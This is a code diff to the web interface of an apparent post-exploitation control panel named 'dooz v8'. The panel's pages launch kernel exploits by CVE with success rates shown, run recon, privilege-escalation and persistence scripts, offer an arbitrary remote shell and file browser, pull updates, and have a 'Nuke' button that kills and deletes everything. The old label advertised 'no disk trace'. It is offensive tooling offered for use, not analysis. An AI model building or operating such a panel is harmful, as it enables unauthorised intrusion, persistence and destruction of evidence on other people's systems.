@@ -3,7 +3,7 @@
 *{margin:0;padding:0;box-sizing:border-box}
 :root{--bg:#0a0a0f;--glass:rgba(255,255,255,0.03);--glass2:rgba(255,255,255,0.06);--border:rgba(255,255,255,0.08);--text:#e4e4e7;--text2:#71717a;--accent:#6366f1;--green:#22c55e;--red:#ef4444;--yellow:#eab308}
 body{font-family:-apple-system,system-ui,sans-serif;background:var(--bg);color:var(--text);min-height:100vh}
-body::before{content:'';position:fixed;top:-50%;left:-50%;width:200%;height:200%;background:radial-gradient(circle at 20% 20%,rgba(99,102,241,0.08) 0%,transparent 40%),radial-gradient(circle at 80% 80%,rgba(34,197,94,0.05) 0%,transparent 40%);pointer-events:none;z-index:-1}
+body::before{content:'';position:fixed;inset:0;background:radial-gradient(circle at 20% 20%,rgba(99,102,241,0.08) 0%,transparent 40%),radial-gradient(circle at 80% 80%,rgba(34,197,94,0.05) 0%,transparent 40%);pointer-events:none;z-index:-1}
 .c{max-width:1100px;margin:0 auto;padding:20px}
 header{display:flex;justify-content:space-between;align-items:center;padding:12px 0;margin-bottom:20px}
 .logo{font-size:20px;font-weight:700;background:linear-gradient(135deg,#6366f1,#8b5cf6);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
@@ -42,6 +42,7 @@ nav a.on{color:#fff;background:var(--accent)}
 .btn:hover{filter:brightness(1.1)}
 .btn-g{background:var(--glass);border:1px solid var(--border);color:var(--text)}
 .btn-r{background:rgba(239,68,68,0.15);color:var(--red);border:1px solid rgba(239,68,68,0.3)}
+.btn-y{background:rgba(234,179,8,0.15);color:var(--yellow);border:1px solid rgba(234,179,8,0.3)}
 .qs{display:flex;flex-wrap:wrap;gap:4px;margin:8px 0}
 .qs span{padding:5px 10px;background:var(--glass2);border:1px solid var(--border);border-radius:5px;font-size:10px;font-family:monospace;color:var(--accent);cursor:pointer}
 .qs span:hover{background:rgba(99,102,241,0.15)}
@@ -70,35 +71,29 @@ nav a.on{color:#fff;background:var(--accent)}
 <div class="logo">dooz<span>v8</span></div>
 <nav><a class="on" data-p="main">Main</a><a data-p="exp">Exploits</a><a data-p="scr">Scripts</a><a data-p="files">Files</a><a data-p="term">Terminal</a><a data-p="cfg">Config</a></nav>
 </header>
-
 <div id="p-main" class="page on">
 <div class="grid">
 <div class="card"><h3>System</h3><div class="stats" id="sys"><div class="stat"><div class="stat-v"><span class="ld"></span></div></div></div></div>
-<div class="card"><h3>Actions</h3><div class="acts"><button class="btn" onclick="nav('exp')">⚡ Exploits</button><button class="btn btn-g" onclick="nav('scr')">📜 Scripts</button><button class="btn btn-g" onclick="nav('term')">💻 Shell</button><button class="btn btn-r" onclick="nuke()">💀 Nuke</button></div></div>
+<div class="card"><h3>Actions</h3><div class="acts"><button class="btn" onclick="nav('exp')">⚡ Exploits</button><button class="btn btn-g" onclick="nav('scr')">📜 Scripts</button><button class="btn btn-g" onclick="nav('term')">💻 Shell</button><button class="btn btn-y" onclick="pull()">🔄 Update</button><button class="btn btn-r" onclick="nuke()">💀 Nuke</button></div></div>
 <div class="card full"><h3>Exploit Scanner</h3><div id="expp"><span class="ld"></span></div></div>
 </div>
 </div>
-
 <div id="p-exp" class="page">
-<div class="card"><h3>Kernel Exploits</h3><p style="color:var(--text2);font-size:11px;margin-bottom:12px">In-memory execution • No disk trace</p><div id="expl"><span class="ld"></span></div></div>
+<div class="card"><h3>Kernel Exploits</h3><p style="color:var(--text2);font-size:11px;margin-bottom:12px">Execute from local clone • In-memory</p><div id="expl"><span class="ld"></span></div></div>
 </div>
-
 <div id="p-scr" class="page">
-<div class="card"><h3>Remote Scripts</h3>
+<div class="card"><h3>Scripts</h3>
 <div class="qs"><span onclick="setS('scripts/sysinfo.sh')">sysinfo</span><span onclick="setS('scripts/recon.sh')">recon</span><span onclick="setS('scripts/privesc.sh')">privesc</span><span onclick="setS('scripts/persist.sh')">persist</span></div>
 <div class="irow"><input id="spath" placeholder="scripts/recon.sh"><button class="btn" onclick="runS()">Run</button></div>
 <div class="term" id="sout" style="margin-top:12px;min-height:120px"></div>
 </div>
 </div>
-
 <div id="p-files" class="page">
 <div class="card"><h3>Files</h3><div class="bc" id="bc">/</div><div class="files" id="fls"></div></div>
 </div>
-
 <div id="p-term" class="page">
 <div class="card"><h3>Shell</h3><div class="term" id="tout"></div><div class="irow"><input id="tcmd" placeholder="command" onkeydown="if(event.key==='Enter')runC()"><button class="btn" onclick="runC()">Run</button></div></div>
 </div>
-
 <div id="p-cfg" class="page">
 <div class="grid">
 <div class="card"><h3>Deploy Key</h3><div class="key" id="dk" onclick="cpK()">%s</div></div>
@@ -106,7 +101,6 @@ nav a.on{color:#fff;background:var(--accent)}
 </div>
 </div>
 </div>
-
 <script>
 const api=async(e,d={})=>(await fetch('/api/'+e,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(d)})).json();
 const $=s=>document.getElementById(s);
@@ -115,40 +109,31 @@ document.querySelectorAll('nav a').forEach(a=>a.onclick=()=>nav(a.dataset.p));
 const setS=s=>$('spath').value=s;
 const cpK=()=>{navigator.clipboard.writeText($('dk').innerText);$('dk').style.background='rgba(34,197,94,0.2)';setTimeout(()=>$('dk').style.background='',500);};
 let cwd='/';
-
 async function init(){
-const s=await api('fetch',{path:'scripts/sysinfo.sh',exec:true});
+const s=await api('run',{path:'scripts/sysinfo.sh'});
 let h='';try{const d=JSON.parse(s.output||'{}');for(const[k,v]of Object.entries(d))h+=`<div class="stat"><div class="stat-l">${k}</div><div class="stat-v">${v}</div></div>`;}catch(e){h=`<div class="stat"><div class="stat-v" style="color:var(--red)">${s.output||'Error'}</div></div>`;}
 $('sys').innerHTML=h;scanP();}
-
 async function scanP(){
-const r=await api('fetch',{path:'exploits/gate.sh',exec:true});
+const r=await api('run',{path:'exploits/gate.sh'});
 try{const d=JSON.parse(r.output||'{}');
 if(d.exploits?.length){let h='';for(const x of d.exploits.slice(0,3)){const c=x.rate>=80?'var(--green)':x.rate>=50?'var(--yellow)':'var(--red)';h+=`<div class="exp" onclick="nav('exp')"><span class="exp-cve">${x.cve}</span><span class="exp-nm">${x.name}</span><span class="exp-rt" style="color:${c}">${x.rate}%</span><div class="exp-bar"><i style="width:${x.rate}%;background:${c}"></i></div></div>`;}
 $('expp').innerHTML=h;}else $('expp').innerHTML='<span style="color:var(--text2);font-size:11px">No exploits</span>';}catch(e){$('expp').innerHTML=`<span style="color:var(--red);font-size:11px">${r.output}</span>`;}}
-
 async function scan(){
 $('expl').innerHTML='<span class="ld"></span>';
-const r=await api('fetch',{path:'exploits/gate.sh',exec:true});
+const r=await api('run',{path:'exploits/gate.sh'});
 try{const d=JSON.parse(r.output||'{}');
 if(d.exploits?.length){let h='';for(const x of d.exploits){const c=x.rate>=80?'var(--green)':x.rate>=50?'var(--yellow)':'var(--red)';h+=`<div class="exp" onclick="runE('${x.cve}')"><span class="exp-cve">${x.cve}</span><span class="exp-nm">${x.name}</span><span class="exp-rt" style="color:${c}">${x.rate}%</span><div class="exp-bar"><i style="width:${x.rate}%;background:${c}"></i></div></div>`;}
 $('expl').innerHTML=h;}else $('expl').innerHTML='<span style="color:var(--text2)">No exploits</span>';}catch(e){$('expl').innerHTML=`<span style="color:var(--red)">${r.output}</span>`;}}
-
-async function runE(cve){if(!confirm('Run '+cve+'?'))return;$('expl').innerHTML=`<span class="ld"></span> ${cve}...`;const r=await api('fetch',{path:'exploits/'+cve+'/run.sh',exec:true});alert(r.output||'Done');scan();}
-
-async function runS(){const p=$('spath').value.trim();if(!p)return;$('sout').innerHTML=`<pre class="cmd">$ ${p}</pre><span class="ld"></span>`;const r=await api('fetch',{path:p,exec:true});$('sout').innerHTML=`<pre class="cmd">$ ${p}</pre><pre class="out">${r.output||'(empty)'}</pre>`;}
-
+async function runE(cve){if(!confirm('Run '+cve+'?'))return;$('expl').innerHTML=`<span class="ld"></span> ${cve}...`;const r=await api('run',{path:'exploits/'+cve+'/run.sh'});alert(r.output||'Done');scan();}
+async function runS(){const p=$('spath').value.trim();if(!p)return;$('sout').innerHTML=`<pre class="cmd">$ ${p}</pre><span class="ld"></span>`;const r=await api('run',{path:p});$('sout').innerHTML=`<pre class="cmd">$ ${p}</pre><pre class="out">${r.output||'(empty)'}</pre>`;}
 async function ls(p){cwd=p;const d=await api('files',{path:p});let bc=`<a href="#" onclick="ls('/');return false">/</a>`;let acc='';for(const x of p.split('/').filter(Boolean)){acc+='/'+x;bc+=` / <a href="#" onclick="ls('${acc}');return false">${x}</a>`;}$('bc').innerHTML=bc;
 let h='';if(p!=='/'){const pr=p.split('/').slice(0,-1).join('/')||'/';h+=`<div class="file" onclick="ls('${pr}')"><div class="file-i">📁</div><div class="file-n">..</div></div>`;}
 for(const f of d.files||[]){const np=p==='/'?'/'+f.name:p+'/'+f.name;h+=`<div class="file" onclick="${f.type==='dir'?`ls('${np}')`:'0'}"><div class="file-i">${f.type==='dir'?'📁':'📄'}</div><div class="file-n">${f.name}</div><div class="file-s">${f.size||''}</div></div>`;}
 $('fls').innerHTML=h||'<div style="padding:16px;color:var(--text2);text-align:center;font-size:12px">Empty</div>';}
-
 async function runC(){const c=$('tcmd').value.trim();if(!c)return;$('tcmd').value='';$('tout').innerHTML+=`<pre class="cmd">$ ${c}</pre>`;const r=await api('exec',{cmd:c});$('tout').innerHTML+=`<pre class="out">${r.output||''}</pre>`;$('tout').scrollTop=1e9;}
-
 async function cfg(){const r=await api('url');$('curl').innerText=r.url||'-';}
-
+async function pull(){const r=await api('pull');alert('Update: '+(r.output||'Done'));location.reload();}
 async function nuke(){if(!confirm('💀 DESTRUCT?\n\nKill + Delete all'))return;await api('destruct');document.body.innerHTML='<div style="display:flex;height:100vh;align-items:center;justify-content:center;flex-direction:column;gap:12px;background:var(--bg)"><div style="font-size:40px">💀</div><div style="font-size:20px;font-weight:700;color:var(--red)">DESTROYED</div></div>';}
-
 init();ls('/');cfg();
 </script>
 </body></html>
